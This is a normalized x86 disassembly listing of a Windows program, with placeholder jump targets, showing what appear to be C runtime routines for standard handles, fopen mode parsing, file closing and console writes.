and [ ebp - 0x24 ] 0x0
push 0x8
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov eax [ rw-data ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x2c ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43150e
cmp ebx 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov edi [ esi ]
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
call sub_40d2a6
retn
mov eax [ ebp - 0x24 ]
add esi 0x4
jmp r-xdata
push edi
call sub_4173ac
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4314e4
mov eax [ ebp - 0x2c ]
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push edi
call sub_4313ef
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ edi + 0xc ]
shr eax 0x1
test al 0x1
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push edi
call sub_4313ef
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_431517
push 0xc
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4313ef
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_431568
mov eax edi
push esi
call sub_43143f
pop ecx
jmp r-xdata
call sub_40d2a6
retn
sub_43157c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0xd
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ edi ]
shr eax 0x6
test al 0x1
je r-xdata
push [ esi + 0x4 ]
call sub_42d0aa
pop ecx
mov eax 0xfffffebf
[ edi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_4315ba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
pop eax
pop ebp
retn
sub_4315dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push ebx
push esi
mov esi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + esi ]
mov [ ebp - 0x4 ] eax
mov eax 0x2000
cmp esi eax
jl r-xdata
push esi
call sub_438f86
mov eax [ rw-data ]
pop ecx
cmp esi eax
jle r-xdata
mov esi eax
push edi
xor edi edi
test esi esi
je r-xdata
mov esi eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
inc edi
add eax 0x4
inc ebx
mov [ ebp - 0x4 ] eax
cmp edi esi
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov dl [ ebx ]
test dl 0x1
je r-xdata
test dl 0x8
jne r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov eax [ ebp - 0x4 ]
add edx [ ecx * 4 + rw-data ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov al [ ebx ]
mov [ edx + 0x28 ] al
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
sub_431692
mov edi edi
push ebx
push esi
push edi
xor edi edi
mov eax edi
mov [ esi + 0x28 ] 0x81
sub eax 0x0
je r-xdata
cmp [ esi + 0x18 ] 0xfffffffe
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
or [ esi + 0x28 ] 0x80
jmp r-xdata
xor eax eax
test ebx ebx
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
inc edi
cmp edi 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
mov [ esi + 0x18 ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
and eax 0xff
mov [ esi + 0x18 ] ebx
cmp eax 0x2
jne r-xdata
push ebx
call [ GetFileType@IAT ]
jmp r-xdata
pop eax
push eax
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul esi eax 0x30
add esi [ ecx * 4 + rw-data ]
cmp [ esi + 0x18 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
cmp eax 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
jmp r-xdata
test eax eax
je r-xdata
or [ esi + 0x28 ] 0x8
jmp r-xdata
sub_431748
push 0xc
push r--data
call sub_40d260
push 0x7
call sub_42f32c
pop ecx
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x4 ] ebx
push ebx
call sub_438f86
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_431795
mov al bl
call sub_40d2a6
retn
call sub_4315dc
call sub_431692
mov bl 0x1
mov [ ebp - 0x19 ] bl
sub_4317a0
push esi
xor esi esi
add esi 0x4
cmp esi 0x200
jb r-xdata
push eax
call sub_438f51
and [ esi + rw-data ] 0x0
pop ecx
mov eax [ esi + rw-data ]
test eax eax
je r-xdata
mov al 0x1
pop esi
retn
sub_431804
push 0xc
push r--data
call sub_40d260
xor edi edi
mov esi [ ebp + 0x8 ]
mov [ esi ] edi
push 0x8
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x1c ]
push eax
call sub_4318ae
pop ecx
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43185a
mov eax esi
call sub_40d2a6
retn
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax ] edi
mov [ eax + 0x4 ] edi
or [ eax + 0x10 ] 0xffffffff
sub_431863
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
add eax 0xc
xchg [ eax ] ecx
pop ebp
retn
sub_4318ae
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ rw-data ]
push esi
push edi
mov edi [ rw-data ]
add edi 0xc
add ebx 0xfffffffd
lea ebx [ edi + ebx * 4 ]
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edi ebx
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
push 0x38
push 0x1
call sub_42d196
push 0x0
mov [ edi ] eax
call sub_42d0aa
mov eax [ edi ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
shr eax 0xd
test al 0x1
jne r-xdata
or [ eax + 0x10 ] 0xffffffff
mov eax [ edi ]
push 0x0
push 0xfa0
add eax 0x20
push eax
call sub_430c30
mov esi [ edi ]
mov ecx 0x2000
lea eax [ esi + 0xc ]
[ eax ] ecx
push esi
call sub_4173ac
pop ecx
jmp r-xdata
add edi 0x4
push esi
call sub_4173ac
pop ecx
lea edx [ esi + 0xc ]
mov ebx 0x2000
mov eax [ edx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
jmp r-xdata
mov ecx eax
or ecx ebx
[ edx ] ecx
jne r-xdata
mov ebx [ ebp - 0x4 ]
shr eax 0xd
not al
test al 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_4173c0
pop ecx
sub_43198c
mov edx [ ecx ]
push esi
mov esi 0x2000
add edx 0xc
mov eax [ edx ]
mov ecx eax
or ecx esi
[ edx ] ecx
jne r-xdata
shr eax 0xd
not eax
and eax 0x1
pop esi
retn
sub_4319ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
lea esi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
xor ecx ecx
cmp al 0x61
je r-xdata
mov [ ebx ] 0x109
cmp al 0x72
je r-xdata
mov ch [ ebp - 0x1 ]
movsx eax al
cmp eax 0x53
jg r-xdata
mov [ ebx ] ecx
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
sub eax 0x54
je r-xdata
je r-xdata
mov dl cl
mov [ ebp - 0x3 ] cl
mov ch cl
mov [ ebp - 0x4 ] cl
inc esi
mov [ ebp - 0x2 ] dl
mov [ ebp - 0x1 ] ch
mov cl 0x1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ ebx ] 0x301
jmp r-xdata
test ch ch
jne r-xdata
push ebx
call sub_4320c6
sub eax 0xe
je r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
sub eax 0x20
je r-xdata
mov [ ebx + 0x4 ] 0x2
push 0x3
push r--data
push esi
call sub_43e240
add esp 0xc
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
jmp r-xdata
push ebx
call sub_4320e5
jmp r-xdata
sub eax 0x1
je r-xdata
xor cl cl
jmp r-xdata
or [ ebx ] 0x20
mov ch [ ebp - 0x1 ]
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
test ch ch
je r-xdata
mov dl [ ebp - 0x2 ]
pop ecx
mov cl al
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_432105
jmp r-xdata
sub eax 0xb
je r-xdata
xor eax eax
test cl cl
setne al
add esi eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_432149
sub eax 0x1
je r-xdata
cmp [ esi ] al
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
jmp r-xdata
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_432127
jmp r-xdata
sub eax 0x6
jne r-xdata
mov ch 0x1
mov [ ebp - 0x1 ] ch
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
push ebx
call sub_43217e
jmp r-xdata
push ebx
call sub_43205d
jmp r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or [ ebx ] 0x80
mov cl 0x1
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_43e2b8
add esp 0xc
test eax eax
jne r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
push 0x8
push r--data
push esi
call sub_43e2b8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebx ] 0x40000
jmp r-xdata
or [ ebx ] 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_43e2b8
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebx ] 0x20000
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov dl 0x1
mov [ ebp - 0x2 ] dl
mov cl dl
jmp r-xdata
add esi 0x7
or [ ebx ] 0x10000
jmp r-xdata
inc esi
jmp r-xdata
sub_431bdf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
lea esi [ ebp - 0x10 ]
push 0x2
pop ecx
push 0x20
stosd [ edi ]
stosd [ edi ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
pop edi
jmp r-xdata
cmp [ esi ] di
je r-xdata
add esi ecx
movzx eax [ esi ]
xor edx edx
cmp eax 0x61
je r-xdata
mov [ ebx ] 0x109
cmp eax 0x72
je r-xdata
mov ch [ ebp - 0x1 ]
cmp eax 0x53
jg r-xdata
mov [ ebx ] edx
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
jne r-xdata
cmp [ esi ] di
je r-xdata
add esi 0x2
sub eax 0x54
je r-xdata
je r-xdata
add esi ecx
mov [ ebp - 0x3 ] dl
xor ch ch
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x2 ] dl
mov cl 0x1
mov [ ebp - 0x1 ] ch
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ ebx ] 0x301
jmp r-xdata
test ch ch
jne r-xdata
push ebx
call sub_4320c6
sub eax 0xe
je r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
sub eax edi
je r-xdata
mov [ ebx + 0x4 ] ecx
push 0x3
push r--data
push esi
call sub_43acc8
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp [ esi ] ax
jne r-xdata
movzx eax [ esi ]
test ax ax
je r-xdata
jmp r-xdata
push ebx
call sub_4320e5
jmp r-xdata
sub eax 0x1
je r-xdata
xor cl cl
jmp r-xdata
or [ ebx ] edi
mov ch [ ebp - 0x1 ]
sub eax 0xb
je r-xdata
add esi 0x6
jmp r-xdata
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
test ch ch
je r-xdata
mov dl [ ebp - 0x2 ]
pop ecx
mov cl al
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_432105
jmp r-xdata
sub eax 0xb
je r-xdata
xor eax eax
test cl cl
setne al
lea esi [ esi + eax * 2 ]
test cl cl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_432149
sub eax 0x1
je r-xdata
cmp [ esi ] di
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
jmp r-xdata
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_432127
jmp r-xdata
sub eax 0x6
jne r-xdata
mov ch 0x1
mov [ ebp - 0x1 ] ch
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
push ebx
call sub_43217e
jmp r-xdata
push ebx
call sub_43205d
jmp r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] di
je r-xdata
or [ ebx ] 0x80
mov cl 0x1
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_43e07b
add esp 0xc
test eax eax
jne r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
push 0x8
push r--data
push esi
call sub_43e07b
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or [ ebx ] 0x40000
jmp r-xdata
or [ ebx ] 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_43e07b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or [ ebx ] 0x20000
jmp r-xdata
cmp [ esi ] di
je r-xdata
mov dl 0x1
mov [ ebp - 0x2 ] dl
mov cl dl
jmp r-xdata
add esi 0xe
or [ ebx ] 0x10000
jmp r-xdata
add esi 0x2
jmp r-xdata
sub_431e23
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_4319ad
mov esi eax
lea edi [ ebp - 0x10 ]
pop ecx
pop ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
jne r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call sub_43ee53
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
add eax 0xc
mov ecx [ ebp - 0xc ]
[ eax ] ecx
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_431ea8
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_431bdf
mov esi eax
lea edi [ ebp - 0x10 ]
pop ecx
pop ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
jne r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call sub_43f1f6
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
add eax 0xc
mov ecx [ ebp - 0xc ]
[ eax ] ecx
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_43200d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43ee53
add esp 0x14
pop ebp
retn
sub_432035
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43f1f6
add esp 0x14
pop ebp
retn
sub_43205d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test al 0x40
je r-xdata
or eax 0x40
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_43208a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx ] 0x10
pop ebp
retn
xor al al
pop ebp
retn
sub_4320a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx ] 0x20
pop ebp
retn
xor al al
pop ebp
retn
sub_4320c6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx 0x1000
mov eax [ ecx ]
test edx eax
je r-xdata
or eax edx
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_4320e5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x8000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_432105
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx + 0x4 ] 0x800
pop ebp
retn
xor al al
pop ebp
retn
sub_432127
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
and [ ecx + 0x4 ] 0xfffff7ff
pop ebp
retn
xor al al
pop ebp
retn
sub_432149
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ edx ]
test al 0x2
jne r-xdata
xor al al
pop ebp
retn
mov ecx [ edx + 0x4 ]
and eax 0xfffffffe
or eax 0x2
and ecx 0xfffffffc
or ecx 0x4
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
mov al 0x1
pop ebp
retn
sub_43217e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x4000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_4321b4
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43901e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
or esi 0xffffffff
push esi
call sub_4323c6
pop ecx
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43222a
mov eax esi
call sub_40d2a6
retn 0xc
sub_432236
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4321b4
mov esp ebp
pop ebp
retn
sub_43229b
mov eax [ ecx ]
push esi
mov esi [ eax ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
pop esi
mov [ eax ] 0x9
or eax 0xffffffff
retn
push esi
call sub_4323c6
pop ecx
pop esi
retn
sub_4322dd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43929b
pop ecx
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
mov eax [ rw-data ]
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_43929b
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push esi
push 0x2
call sub_43929b
push 0x1
mov esi eax
call sub_43929b
pop ecx
pop ecx
cmp eax esi
pop esi
je r-xdata
pop ebp
jmp [ GetLastError@IAT ]
sub_432347
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_432236
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_4323c6
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_43929b
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor esi esi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push edi
call sub_43920a
pop ecx
mov ecx edi
and edi 0x3f
sar ecx 0x6
imul edx edi 0x30
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x28 ] 0x0
test esi esi
je r-xdata
push edi
call sub_43929b
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push 0x2
call sub_43929b
push 0x1
mov esi eax
call sub_43929b
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
push esi
call sub_42febf
pop ecx
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
pop edi
pop esi
pop ebp
retn
sub_432468
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_43248e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx eax
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
push esi
mov esi [ ebp + 0x8 ]
mov eax [ edx * 4 + rw-data ]
xor edx edx
push edx
mov ecx [ eax + ecx + 0x18 ]
lea eax [ esi + 0x4 ]
push eax
push [ ebp + 0x14 ]
mov [ esi ] edx
push [ ebp + 0x10 ]
mov [ eax ] edx
push ecx
mov [ eax + 0x4 ] edx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_4324dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
push ebx
imul ebx eax 0x30
push esi
mov eax [ ecx * 4 + rw-data ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ecx
mov eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
add eax edi
mov [ ebp - 0x24 ] eax
call [ GetConsoleCP@IAT ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ch [ edi ]
xor eax eax
mov [ ebp - 0x18 ] ax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1b ] ch
mov edx [ eax * 4 + rw-data ]
mov cl [ edx + ebx + 0x2d ]
test cl 0x4
je r-xdata
call sub_439419
movzx ecx [ edi ]
mov edx 0x8000
test [ eax + ecx * 2 ] dx
je r-xdata
mov al [ edx + ebx + 0x2e ]
and cl 0xfb
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
push 0x2
mov [ ebp - 0xb ] ch
mov [ edx + ebx + 0x2d ] cl
push eax
jmp r-xdata
push 0x1
push edi
cmp edi [ ebp - 0x24 ]
jae r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_434447
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x14 ]
push ecx
push ecx
push 0x5
push eax
push 0x1
lea eax [ ebp - 0x18 ]
inc edi
push eax
push ecx
push [ ebp - 0x38 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
mov al [ edi ]
mov ecx [ edx * 4 + rw-data ]
mov [ ecx + ebx + 0x2e ] al
